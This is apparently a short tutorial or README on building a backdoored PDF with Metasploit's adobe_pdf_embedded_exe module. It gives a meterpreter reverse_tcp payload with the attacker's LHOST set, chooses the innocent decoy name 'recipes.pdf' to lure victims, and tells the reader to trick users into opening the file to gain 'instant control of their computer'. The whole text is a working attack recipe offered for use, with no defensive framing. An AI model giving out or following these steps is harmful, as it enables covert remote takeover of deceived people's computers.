# How-to-Embed-a-backdoor-in-a-PDF-file
How to Embed a backdoor in a PDF file


Step 1)Run Metasploit

Step2) Find the Appropriate Exploit.

I will search metasploits database for an exploit for adobe pdf on windows, using this command:

●Code:msf > search type:exploit platform:windows adobe pdf

You should see the exploit "exploit/windows/fileformat/adobe_pdf_embedded_exe", which we will use:

●Code:msf > use exploit/windows/fileformat/adobe_pdf_embedded_exe

Step 3) Set the Payload

I will use the meterpreter payload again, because it is one of the most powerful payloads available to us:

●Code:msf > exploit (adobe_pdf_embedded_exe) > set payload windows/meterpreter/reverse_tcp

Step 4) Set the exploit options

First, display the required options for the exploit:

●Code:msf > exploit (adobe_pdf_embedded_exe) > show options

You can see that we must provide an existing PDF file to the INFILENAME option in which to embed the meterpreter payload. I will call it "hemantexample.pdf":

●Code: msf > exploit (adobe_pdf_embedded_exe) > set INFILENAME example.pdf

The next option is the output file name, FILENAME. Change this to something innocent that will attract users to open it:
msf > exploit (adobe_pdf_embedded_exe) > set FILENAME recipes.pdf

Finally, we need to specify the LHOST, which is our (the attackers) IP address. Mine is 192.168.1.8:

●Code:msf > exploit (adobe_pdf_embedded_exe) > set LHOST 192.168.1.8

Step5) Run the Exploit.

Now that all the options are set, we can run the exploit like this:

●Code: msf > exploit (adobe_pdf_embedded_exe) > exploit

Metasploit has created a PDF named recipes.pdf that contains the Meterpeter listener. Now, simply get users to open the pdf (Social Engineering again), and you will get instant control of their computer easy as fucking smile :)
